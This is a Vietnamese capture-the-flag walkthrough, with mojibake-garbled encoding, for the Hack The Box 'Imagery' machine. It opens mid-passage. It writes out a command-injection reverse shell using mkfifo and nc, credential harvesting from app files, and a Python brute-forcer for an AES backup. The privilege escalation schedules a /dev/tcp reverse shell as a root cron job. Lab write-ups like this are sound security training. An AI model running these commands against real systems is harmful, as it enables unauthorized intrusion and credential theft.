Ä‘Æ°á»£c tá»« env:\nUser hiá»‡n táº¡i: web MÃ´i trÆ°á»ng hiá»‡n táº¡i: MÃ´i trÆ°á»ng áº£o Python táº¡i /home/web/web/env/bin Home: /home/web Shell: /bin/bash GiÃ¡m sÃ¡t memory cá»§a service flaskapp.service (á»©ng dá»¥ng Flask) Nhá» Claude liá»‡t kÃª má»™t sá»‘ tÃªn file config cá»§a Flask cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng\ndb.json\nPassword hash chá»‰ lÃ  MD5, má»™t thuáº­t toÃ¡n mÃ£ hÃ³a cá»±c yáº¿u. DÃ¹ng Crackstation Ä‘á»ƒ crack pasword.\nTÃ´i cÃ³ password cá»§a testuser. Login web vá»›i user má»›i tÃ¬m Ä‘Æ°á»£c.\nCommand injection # Logic ban Ä‘áº§u cá»§a tÃ´i lÃ  tÃ¬m kiáº¿m táº¥t cáº£ POST requests Ä‘á»ƒ thá»±c hiá»‡n inject trÃªn cÃ¡c request nÃ y. Sau má»™t thá»i gian tÆ°Æ¡ng Ä‘á»‘i dÃ i khÃ¡m phÃ¡ web, tÃ´i tÃ¬m tháº¥y má»™t lá»— há»•ng Command Injection trong pháº§n chá»‰nh sá»­a áº£nh.\nÄáº§u tiÃªn thá»±c hiá»‡n upload áº£nh. Quay láº¡i áº£nh vá»«a upload vÃ  chá»n Transform Image\nChá»n Crop â†’ Apply Transformation.\nQuay trá»Ÿ láº¡i BurpSuite vÃ  láº¥y request nÃ y sang Repeater.\nSau khi thá»­ cÃ¡c payload cá»§a cÃ¡c lá»— há»•ng khÃ¡c nhau, tÃ´i tÃ¬m tháº¥y Command Injection trong x param.\nKhi tiÃªm 1 cÃ¢u lá»‡nh kÃ¨m kÃ½ tá»± Ä‘áº·c biá»‡t, káº¿t quáº£ tráº£ vá» lá»—i /bin/sh: 1: Syntax error, chá»©ng tá» server Ä‘Ã£ xá»­ lÃ½ cÃ¢u lá»‡nh. Thá»­ cÃ¡c bypass filter.\nRemote code execution (RCE) # Báº­t netcat listener trÃªn mÃ¡y kali vá»›i port tÃ¹y chá»n.\nnc -lnvp 9001 Sá»­ dá»¥ng Revshells.com Ä‘á»ƒ táº¡o reverhsell. TÃ´i sá»­ dá»¥ng shell bÃªn dÆ°á»›i vá»›i IP cá»§a mÃ¡y kali vÃ  port Ä‘Ã£ láº¯ng nghe bÃªn trÃªn.\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.14.7 9001 \u0026gt;/tmp/f Quay trá»Ÿ láº¡i mÃ¡y kali.\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Imagery] â””â”€$ nc -lnvp 9001 listening on [any] 9001 ... connect to [10.10.14.7] from (UNKNOWN) [10.10.11.88] 36592 bash: cannot set terminal process group (1374): Inappropriate ioctl for device bash: no job control in this shell bash-5.2$ id id uid=1001(web) gid=1001(web) groups=1001(web) bash-5.2$ Khai thÃ¡c thÃ´ng tin bÃªn trong thÆ° má»¥c.\nbash-5.2$ ls -la ls -la total 104 drwxrwxr-x 9 web web 4096 Sep 22 18:56 . drwxr-x--- 7 web web 4096 Sep 22 18:56 .. -rw-rw-r-- 1 web web 9784 Aug 5 08:56 api_admin.py -rw-rw-r-- 1 web web 6398 Aug 5 08:56 api_auth.py -rw-rw-r-- 1 web web 11876 Aug 5 08:57 api_edit.py -rw-rw-r-- 1 web web 9091 Aug 5 08:57 api_manage.py -rw-rw-r-- 1 web web 840 Aug 5 08:58 api_misc.py -rw-rw-r-- 1 web web 3698 Sep 18 18:35 api_upload.py -rw-rw-r-- 1 web web 1943 Aug 5 15:21 app.py drwxr-xr-x 2 root root 4096 Sep 22 18:56 bot -rw-rw-r-- 1 web web 1809 Aug 5 08:59 config.py -rw-rw-r-- 1 web web 3976 Oct 14 08:52 db.json drwxrwxr-x 5 web web 4096 Sep 22 18:56 env drwxr-xr-x 2 web web 4096 Sep 22 18:56 __pycache__ drwxr-xr-x 3 web web 4096 Sep 22 18:56 static drwxrwxr-x 2 web web 4096 Oct 14 08:36 system_logs drwxrwxr-x 2 web web 4096 Sep 22 18:56 templates drwxrwxr-x 3 web web 4096 Oct 14 08:36 uploads -rw-rw-r-- 1 web web 4023 Aug 5 09:00 utils.py bash-5.2$ ls -la bot ls -la bot total 16 drwxr-xr-x 2 root root 4096 Sep 22 18:56 . drwxrwxr-x 9 web web 4096 Sep 22 18:56 .. -rwxr-xr-x 1 web web 6899 Aug 2 19:56 admin.py bash-5.2$ cat bot/admin.py cat bot/admin.py from selenium import webdriver from selenium.webdriver.chrome.options import Options from selenium.webdriver.common.by import By from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support import expected_conditions as EC import tempfile, shutil, time, traceback, uuid, os, glob # ----- Config ----- CHROME_BINARY = \u0026#34;/usr/bin/google-chrome\u0026#34; USERNAME = \u0026#34;admin@imagery.htb\u0026#34; PASSWORD = \u0026#34;stro*****beach\u0026#34; BYPASS_TOKEN = \u0026#34;K7Zg9vB$24NmW!q8xR0p%tL!\u0026#34; APP_URL = \u0026#34;http://0.0.0.0:8000\u0026#34; # ------------------ # Clean up old profiles for folder in glob.glob(\u0026#34;/tmp/chrome-profile-*\u0026#34;): try: shutil.rmtree(folder, ignore_errors=True) except Exception: pass # Check /tmp space total, used, free = shutil.disk_usage(\u0026#34;/tmp\u0026#34;) if free \u0026lt; 50 * 1024 * 1024: print(f\u0026#34;[!] WARNING: /tmp is low on space! Only {free / 1024 / 1024:.2f} MB free.\u0026#34;) # Create new profile user_data_dir = f\u0026#34;/tmp/chrome-profile-{uuid.uuid4()}\u0026#34; os.makedirs(user_data_dir, exist_ok=True) # Configure Chrome options = Options() options.binary_location = CHROME_BINARY options.add_argument(\u0026#34;--headless=new\u0026#34;) options.add_argument(\u0026#34;--no-sandbox\u0026#34;) options.add_argument(\u0026#34;--disable-dev-shm-usage\u0026#34;) options.add_argument(f\u0026#34;--user-data-dir={user_data_dir}\u0026#34;) options.set_capability(\u0026#34;goog:loggingPrefs\u0026#34;, {\u0026#34;browser\u0026#34;: \u0026#34;ALL\u0026#34;}) .................... á» Ä‘Ã¢y tÃ´i cÃ³ thÃªm credential cá»§a admin. Tuy nhiÃªn Ä‘áº¿n bÆ°á»›c nÃ y rá»“i thÃ¬ user nÃ y khÃ´ng cÃ²n quÃ¡ quan trá»ng, chá»‰ lÆ°u láº¡i password biáº¿t Ä‘Ã¢u sáº½ dÃ¹ng Ä‘Æ°á»£c cho cÃ¡c pháº§n tiáº¿p theo.\nThá»­ tÃ¬m táº¥t cáº£ cÃ¡c thÆ° má»¥c vÃ  file chá»©a má»™t sá»‘ Ä‘uÃ´i nháº¡y cáº£m.\nfind / \\( -iname \u0026#34;*id_rsa\u0026#34; -o -iname \u0026#34;*db\u0026#34; -o -iname \u0026#34;*sql\u0026#34; -o -iname \u0026#34;*key\u0026#34; -o -iname \u0026#34;*pem\u0026#34; -o -iname \u0026#34;*backup\u0026#34; -o -iname \u0026#34;*bak\u0026#34; -o -iname \u0026#34;*conf\u0026#34; \\) 2\u0026gt;/dev/null bash-5.2$ find / \\( -iname \u0026#34;*id_rsa\u0026#34; -o -iname \u0026#34;*db\u0026#34; -o -iname \u0026#34;*sql\u0026#34; -o -iname \u0026#34;*key\u0026#34; -o -iname \u0026#34;*pem\u0026#34; -o -iname \u0026#34;*backup\u0026#34; -o -iname \u0026#34;*bak\u0026#34; -o -iname \u0026#34;*conf\u0026#34; \\) 2\u0026gt;/dev/null \u0026lt;\u0026#34; -o -iname \u0026#34;*bak\u0026#34; -o -iname \u0026#34;*conf\u0026#34; \\) 2\u0026gt;/dev/null /var/backup /var/cache/debconf /var/cache/man/ro/index.db /var/cache/man/sr/index.db /var/cache/man/fr/index.db ............... bash-5.2$ cd /var/backup cd /var/backup bash-5.2$ ls -la ls -la total 22524 drwxr-xr-x 2 root root 4096 Sep 22 18:56 . drwxr-xr-x 14 root root 4096 Sep 22 18:56 .. -rw-rw-r-- 1 root root 23054471 Aug 6 2024 web_20250806_120723.zip.aes Báº­t http server trÃªn mÃ¡y nÃ y, láº¥y file nÃ y vá» mÃ¡y kali Ä‘á»ƒ phÃ¢n tÃ­ch.\nbash-5.2$ python3 -m http.server 4444 python3 -m http.server 4444 â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Imagery] â””â”€$ wget http://10.10.11.88:4444/web_20250806_120723.zip.aes --2025-10-14 05:53:01-- http://10.10.11.88:4444/web_20250806_120723.zip.aes Connecting to 10.10.11.88:4444... connected. HTTP request sent, awaiting response... 200 OK Length: 23054471 (22M) [application/octet-stream] Saving to: â€˜web_20250806_120723.zip.aesâ€™ web_20250806_120723.zip.aes 100%[============================================================================\u0026gt;] 21.99M 120KB/s in 2m 1s 2025-10-14 05:55:02 (187 KB/s) - â€˜web_20250806_120723.zip.aesâ€™ saved [23054471/23054471] PhÃ¢n tÃ­ch file nÃ y, Ä‘Ã¢y lÃ  file mÃ£ hÃ³a sá»­ dá»¥ng AES, Ä‘Æ°á»£c táº¡o bá»Ÿi pyAesCrypt 6.1.1\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Imagery] â””â”€$ file web_20250806_120723.zip.aes web_20250806_120723.zip.aes: AES encrypted data, version 2, created by \u0026#34;pyAesCrypt 6.1.1\u0026#34; Há»i Claude vá» cÃ¡ch decrypt Ä‘Æ°á»£c file nÃ y vÃ  nháº­n Ä‘Æ°á»£c káº¿t quáº£ lÃ  sá»­ dá»¥ng chÃ­nh pyAesCrypt Ä‘á»ƒ giáº£i mÃ£.\nCÃ i Ä‘áº·t pyAesCrypt\npip3 install pyaescrypt --break-system-packages â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Imagery] â””â”€$ pyAesCrypt -h usage: pyAesCrypt [-h] [-o OUT] [-p PASSWORD] (-e | -d) filename Encrypt/decrypt a file using AES256-CBC. positional arguments: filename file to encrypt/decrypt options: -h, --help show this help message and exit -o, --out OUT specify output file -p, --password PASSWORD specify the password -e, --encrypt encrypt file -d, --decrypt decrypt file â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Imagery] â””â”€$ pyAesCrypt -d web_20250806_120723.zip.aes -o web_20250806_120723.zip Password: Wrong password (or file is corrupted). Thá»­ vá»›i táº¥t cáº£ password mÃ  tÃ´i Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c nhÆ°ng Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£. TÃ´i sáº½ viáº¿t 1 Ä‘oáº¡n mÃ£ python Ä‘Æ¡n giáº£n Ä‘á»ƒ thá»­ brute-force password cá»§a file nÃ y.\nnano aes_brute.py import pyAesCrypt import sys def decrypt(encrypted_file, password): try: pyAesCrypt.decryptFile( encrypted_file, \u0026#34;web_20250806_120723.zip\u0026#34;, password, 256 * 1024 ) return True except: return False # Äá»c wordlist with open(\u0026#39;/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#39;latin-1\u0026#39;) as f: for line in f: password = line.strip() print(f\u0026#34;Trying: {password}\u0026#34;, end=\u0026#39;\\r\u0026#39;) if decrypt(\u0026#39;web_20250806_120723.zip.aes\u0026#39;, password): print(f\u0026#34;\\n[+] Password found: {password}\u0026#34;) sys.exit(0) print(\u0026#34;\\n[-] Password not found\u0026#34;) â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Imagery] â””â”€$ python aes_brute.py Trying: be******ds [+] Password found: be******ds ThÃ nh cÃ´ng tÃ¬m Ä‘Æ°á»£c password, quay trá»Ÿ láº¡i thá»±c hiá»‡n decrypt file\npyAesCrypt -d web_20250806_120723.zip.aes -o web_20250806_120723.zip -p \u0026#39;be******ds\u0026#39; Giáº£i nÃ©n file zip\nunzip web_20250806_120723.zip TÃ´i nháº­n Ä‘Æ°á»£c thÆ° má»¥c web Ä‘Æ°á»£c backup.\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Imagery/web] â””â”€$ ll total 92 -rw-rw-r-- 1 kali kali 9784 Aug 5 08:56 api_admin.py -rw-rw-r-- 1 kali kali 6398 Aug 5 08:56 api_auth.py -rw-rw-r-- 1 kali kali 11876 Aug 5 08:57 api_edit.py -rw-rw-r-- 1 kali kali 9091 Aug 5 08:57 api_manage.py -rw-rw-r-- 1 kali kali 840 Aug 5 08:58 api_misc.py -rw-rw-r-- 1 kali kali 12082 Aug 5 08:58 api_upload.py -rw-rw-r-- 1 kali kali 1943 Aug 5 15:21 app.py -rw-rw-r-- 1 kali kali 1809 Aug 5 08:59 config.py -rw-rw-r-- 1 kali kali 1503 Aug 6 12:07 db.json drwxrwxr-x 5 kali kali 4096 Oct 14 12:04 env drwxrwxr-x 2 kali kali 4096 Oct 14 12:03 __pycache__ drwxrwxr-x 2 kali kali 4096 Oct 14 12:03 system_logs drwxrwxr-x 2 kali kali 4096 Oct 14 12:03 templates -rw-rw-r-- 1 kali kali 4023 Aug 5 09:00 utils.py Trong file db.json tÃ´i tÃ¬m tháº¥y thÃªm thÃ´ng tin Ä‘Äƒng nháº­p cá»§a user web vÃ  mark\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Imagery/web] â””â”€$ cat db.json { \u0026#34;users\u0026#34;: [ { \u0026#34;username\u0026#34;: \u0026#34;admin@imagery.htb\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;5d9c1d507a3f76af1e5c97a3ad1eaa31\u0026#34;, \u0026#34;displayId\u0026#34;: \u0026#34;f8p10uw0\u0026#34;, \u0026#34;isTestuser\u0026#34;: false, \u0026#34;isAdmin\u0026#34;: true, \u0026#34;failed_login_attempts\u0026#34;: 0, \u0026#34;locked_until\u0026#34;: null }, { \u0026#34;username\u0026#34;: \u0026#34;testuser@imagery.htb\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;2c65c8d7bfbca32a3ed42596192384f6\u0026#34;, \u0026#34;displayId\u0026#34;: \u0026#34;8utz23o5\u0026#34;, \u0026#34;isTestuser\u0026#34;: true, \u0026#34;isAdmin\u0026#34;: false, \u0026#34;failed_login_attempts\u0026#34;: 0, \u0026#34;locked_until\u0026#34;: null }, { \u0026#34;username\u0026#34;: \u0026#34;mark@imagery.htb\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;01c3d2*************a367cf53e535\u0026#34;, \u0026#34;displayId\u0026#34;: \u0026#34;868facaf\u0026#34;, \u0026#34;isAdmin\u0026#34;: false, \u0026#34;failed_login_attempts\u0026#34;: 0, \u0026#34;locked_until\u0026#34;: null, \u0026#34;isTestuser\u0026#34;: false }, { \u0026#34;username\u0026#34;: \u0026#34;web@imagery.htb\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;84e3c804***************f3da177e0\u0026#34;, \u0026#34;displayId\u0026#34;: \u0026#34;7be291d4\u0026#34;, \u0026#34;isAdmin\u0026#34;: true, \u0026#34;failed_login_attempts\u0026#34;: 0, \u0026#34;locked_until\u0026#34;: null, \u0026#34;isTestuser\u0026#34;: false } ], \u0026#34;images\u0026#34;: [], \u0026#34;bug_reports\u0026#34;: [], \u0026#34;image_collections\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;My Images\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Unsorted\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Converted\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Transformed\u0026#34; } ] } Sá»­ dá»¥ng Crackstation Ä‘á»ƒ crack 2 password nÃ y vÃ  thá»­ switch user báº±ng password vá»«a tÃ¬m Ä‘Æ°á»£c.\nbash-5.2$ id id uid=1001(web) gid=1001(web) groups=1001(web) bash-5.2$ su mark su mark Password: s******sh id uid=1002(mark) gid=1002(mark) groups=1002(mark) python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; bash-5.2$ cd cd bash-5.2$ ls -la ls -la total 24 drwxr-x--- 2 mark mark 4096 Sep 22 18:56 . drwxr-xr-x 4 root root 4096 Sep 22 18:56 .. lrwxrwxrwx 1 root root 9 Sep 22 13:21 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 mark mark 220 Aug 20 2024 .bash_logout -rw-r--r-- 1 mark mark 3771 Aug 20 2024 .bashrc -rw-r--r-- 1 mark mark 807 Aug 20 2024 .profile -rw-r----- 1 root mark 33 Oct 14 05:26 user.txt bash-5.2$ Privilege escalation # Lá»‡nh Ä‘áº§u tiÃªn mÃ  tÃ´i luÃ´n thá»­ sudo -l\nbash-5.2$ sudo -l sudo -l Matching Defaults entries for mark on Imagery: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User mark may run the following commands on Imagery: (ALL) NOPASSWD: /usr/local/bin/charcol Thá»­ cháº¡y file nÃ y\nbash-5.2$ sudo /usr/local/bin/charcol help sudo /usr/local/bin/charcol help usage: charcol.py [--quiet] [-R] {shell,help} ... Charcol: A CLI tool to create encrypted backup zip files. positional arguments: {shell,help} Available commands shell Enter an interactive Charcol shell. help Show help message for Charcol or a specific command. options: --quiet Suppress all informational output, showing only warnings and errors. -R, --reset-password-to-default Reset application password to default (requires system password verification). ÄÃ¢y chÃ­nh lÃ  cÃ´ng cá»¥ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ mÃ£ hÃ³a ra file aes mÃ  tÃ´i Ä‘Ã£ decrypt Ä‘Æ°á»£c á»Ÿ pháº§n trÃªn.\nbash-5.2$ sudo /usr/local/bin/charcol shell sudo /usr/local/bin/charcol shell â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆ Charcol The Backup Suit - Development edition 1.0.0 [2025-10-14 16:19:52] [INFO] Entering Charcol interactive shell. Type \u0026#39;help\u0026#39; for commands, \u0026#39;exit\u0026#39; to quit. charcol\u0026gt; help help [2025-10-14 16:20:05] [INFO] Charcol Shell Commands: Backup \u0026amp; Fetch: backup -i \u0026lt;paths...\u0026gt; [-o \u0026lt;output_file\u0026gt;] [-p \u0026lt;file_password\u0026gt;] [-c \u0026lt;level\u0026gt;] [--type \u0026lt;archive_type\u0026gt;] [-e \u0026lt;patterns...\u0026gt;] [--no-timestamp] [-f] [--skip-symlinks] [--ask-password] Purpose: Create an encrypted backup archive from specified files/directories. Output: File will have a \u0026#39;.aes\u0026#39; extension if encrypted. Defaults to \u0026#39;/var/backup/\u0026#39;. Naming: Automatically adds timestamp unless --no-timestamp is used. If no -o, uses input filename as base. Permissions: Files created with 664 permissions. Ownership is user:group. Encryption: - If \u0026#39;--app-password\u0026#39; is set (status 1) and no \u0026#39;-p \u0026lt;file_password\u0026gt;\u0026#39; is given, uses the application password for encryption. - If \u0026#39;no password\u0026#39; mode is set (status 2) and no \u0026#39;-p \u0026lt;file_password\u0026gt;\u0026#39; is given, creates an UNENCRYPTED archive. Examples: - Encrypted with file-specific password: backup -i /home/user/my_docs /var/log/nginx/access.log -o /tmp/web_logs -p \u0026lt;file_password\u0026gt; --verbose --type tar.gz -c 9 - Encrypted with app password (if status 1): backup -i /home/user/example_file.json - Unencrypted (if status 2 and no -p): backup -i /home/user/example_file.json - No timestamp: backup -i /home/user/example_file.json --no-timestamp fetch \u0026lt;url\u0026gt; [-o \u0026lt;output_file\u0026gt;] [-p \u0026lt;file_password\u0026gt;] [-f] [--ask-password] Purpose: Download a file from a URL, encrypt it, and save it. Output: File will have a \u0026#39;.aes\u0026#39; extension if encrypted. Defaults to \u0026#39;/var/backup/fetched_file\u0026#39;. Permissions: Files created with 664 permissions. Ownership is current user:group. Restrictions: Fetching from loopback addresses (e.g., localhost, 127.0.0.1) is blocked. Encryption: - If \u0026#39;--app-password\u0026#39; is set (status 1) and no \u0026#39;-p \u0026lt;file_password\u0026gt;\u0026#39; is given, uses the application password for encryption. - If \u0026#39;no password\u0026#39; mode is set (status 2) and no \u0026#39;-p \u0026lt;file_password\u0026gt;\u0026#39; is given, creates an UNENCRYPTED file. Examples: - Encrypted: fetch \u0026lt;URL\u0026gt; -o \u0026lt;output_file_path\u0026gt; -p \u0026lt;file_password\u0026gt; --force - Unencrypted (if status 2 and no -p): fetch \u0026lt;URL\u0026gt; -o \u0026lt;output_file_path\u0026gt; Integrity \u0026amp; Extraction: list \u0026lt;encrypted_file\u0026gt; [-p \u0026lt;file_password\u0026gt;] [--ask-password] Purpose: Decrypt and list contents of an encrypted Charcol archive. Note: Requires the correct decryption password. Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes. Example: list /var/backup/\u0026lt;encrypted_file_name\u0026gt;.zip.aes -p \u0026lt;file_password\u0026gt; check \u0026lt;encrypted_file\u0026gt; [-p \u0026lt;file_password\u0026gt;] [--ask-password] Purpose: Decrypt and verify the structural integrity of an encrypted Charcol archive. Note: Requires the correct decryption password. This checks the archive format, not internal data consistency. Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes. Example: check /var/backup/\u0026lt;encrypted_file_name\u0026gt;.tar.gz.aes -p \u0026lt;file_password\u0026gt; extract \u0026lt;encrypted_file\u0026gt; \u0026lt;output_directory\u0026gt; [-p \u0026lt;file_password\u0026gt;] [--ask-password] Purpose: Decrypt an encrypted Charcol archive and extract its contents. Note: Requires the correct decryption password. Example: extract /var/backup/\u0026lt;encrypted_file_name\u0026gt;.zip.aes /tmp/restored_data -p \u0026lt;file_password\u0026gt; Automated Jobs (Cron): auto add --schedule \u0026#34;\u0026lt;cron_schedule\u0026gt;\u0026#34; --command \u0026#34;\u0026lt;shell_command\u0026gt;\u0026#34; --name \u0026#34;\u0026lt;job_name\u0026gt;\u0026#34; [--log-output \u0026lt;log_file\u0026gt;] Purpose: Add a new automated cron job managed by Charcol. Verification: - If \u0026#39;--app-password\u0026#39; is set (status 1): Requires Charcol application password (via global --app-password flag). - If \u0026#39;no password\u0026#39; mode is set (status 2): Requires system password verification (in interactive shell). Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths. Examples: - Status 1 (encrypted app password), cron: CHARCOL_NON_INTERACTIVE=true charcol --app-password \u0026lt;app_password\u0026gt; auto add \\ --schedule \u0026#34;0 2 * * *\u0026#34; --command \u0026#34;charcol backup -i /home/user/docs -p \u0026lt;file_password\u0026gt;\u0026#34; \\ --name \u0026#34;Daily Docs Backup\u0026#34; --log-output \u0026lt;log_file_path\u0026gt; - Status 2 (no app password), cron, unencrypted backup: CHARCOL_NON_INTERACTIVE=true charcol auto add \\ --schedule \u0026#34;0 2 * * *\u0026#34; --command \u0026#34;charcol backup -i /home/user/docs\u0026#34; \\ --name \u0026#34;Daily Docs Backup\u0026#34; --log-output \u0026lt;log_file_path\u0026gt; - Status 2 (no app password), interactive: auto add --schedule \u0026#34;0 2 * * *\u0026#34; --command \u0026#34;charcol backup -i /home/user/docs\u0026#34; \\ --name \u0026#34;Daily Docs Backup\u0026#34; --log-output \u0026lt;log_file_path\u0026gt; (will prompt for system password) auto list Purpose: List all automated jobs managed by Charcol. Example: auto list auto edit \u0026lt;job_id\u0026gt; [--schedule \u0026#34;\u0026lt;new_schedule\u0026gt;\u0026#34;] [--command \u0026#34;\u0026lt;new_command\u0026gt;\u0026#34;] [--name \u0026#34;\u0026lt;new_name\u0026gt;\u0026#34;] [--log-output \u0026lt;new_log_file\u0026gt;] Purpose: Modify an existing Charcol-managed automated job. Verification: Same as \u0026#39;auto add\u0026#39;. Example: auto edit \u0026lt;job_id\u0026gt; --schedule \u0026#34;30 4 * * *\u0026#34; --name \u0026#34;Updated Backup Job\u0026#34; auto delete \u0026lt;job_id\u0026gt; Purpose: Remove an automated job managed by Charcol. Verification: Same as \u0026#39;auto add\u0026#39;. Example: auto delete \u0026lt;job_id\u0026gt; Shell \u0026amp; Help: shell Purpose: Enter this interactive Charcol shell. Example: shell exit Purpose: Exit the Charcol shell. Example: exit clear Purpose: Clear the interactive shell screen. Example: clear help [command] Purpose: Show help for Charcol or a specific command. Example: help backup Global Flags (apply to all commands unless overridden): --app-password \u0026lt;password\u0026gt; : Provide the Charcol *application password* directly. Required for \u0026#39;auto\u0026#39; commands if status 1. Less secure than interactive prompt. -p, \u0026#34;--password\u0026#34; \u0026lt;password\u0026gt; : Provide the *file encryption/decryption password* directly. Overrides application password for file operations. Less secure than --ask-password. -v, \u0026#34;--verbose\u0026#34; : Enable verbose output. --quiet : Suppress informational output (show only warnings and errors). --log-file \u0026lt;path\u0026gt; : Log all output to a specified file. --dry-run : Simulate actions without actual file changes (for \u0026#39;backup\u0026#39; and \u0026#39;fetch\u0026#39;). --ask-password : Prompt for the *file encryption/decryption password* securely. Overrides -p and application password for file operations. --no-banner : Do not display the ASCII banner. -R, \u0026#34;--reset-password-to-default\u0026#34; : Reset application password to default (requires system password verification). charcol\u0026gt; Sau khi Ä‘á»c vÃ  phÃ¢n tÃ­ch pháº§n hÆ°á»›ng dáº«n cá»§a cÃ´ng cá»¥ nÃ y, tÃ´i Ä‘á»ƒ Ã½ tháº¥y pháº§n Automated Jobs (Cron) cho phÃ©p cháº¡y --command Ä‘á»ƒ Ä‘áº·t lá»‹ch thá»±c hiá»‡n cÃ¢u lá»‡nh backup. Váº­y thÃ¬ thay báº±ng cÃ¢u lá»‡nh backup, tÃ´i cÃ³ thá»ƒ thÃªm revershell vÃ o Ä‘Ã¢y.\nCÃ¢u lá»‡nh nhÆ° bÃªn dÆ°á»›i, vá»›i --schedule Ä‘á»ƒ Ä‘áº·t thá»i gian cháº¡y lá»‡nh, --command lÃ  cÃ¢u lá»‡nh thá»±c thi vÃ  --name Ä‘á»ƒ Ä‘áº·t tÃªn cho job nÃ y, cuá»‘i cÃ¹ng thÃªm IP cá»§a mÃ¡y kali vÃ  port tÃ¹y chá»n.\nauto add --schedule \u0026#34;* * * * *\u0026#34; --command \u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.7/7777 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; --name \u0026#34;RevShell\u0026#34; TrÆ°á»›c khi Enter thÃ¬ báº­t listener trÃªn mÃ¡y kali.\nnc -lnvp 7777 charcol\u0026gt; auto add --schedule \u0026#34;* * * * *\u0026#34; --command \u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.7/7777 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; --name \u0026#34;RevShell\u0026#34; \u0026lt;\u0026amp; /dev/tcp/10.10.14.7/7777 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; --name \u0026#34;RevShell\u0026#34; [2025-10-14 16:36:59] [INFO] System password verification required for this operation. Enter system password for user \u0026#39;mark\u0026#39; to confirm: s*******sh [2025-10-14 16:37:07] [INFO] System password verified successfully. [2025-10-14 16:37:07] [INFO] Auto job \u0026#39;RevShell\u0026#39; (ID: 2ff71144-4fca-41b8-a836-ef6d157eeea4) added successfully. The job will run according to schedule. [2025-10-14 16:37:07] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true /bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.7/7777 0\u0026gt;\u0026amp;1\u0026#39; Quay trá»Ÿ láº¡i listener.\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Imagery/web] â””â”€$ nc -lnvp 7777 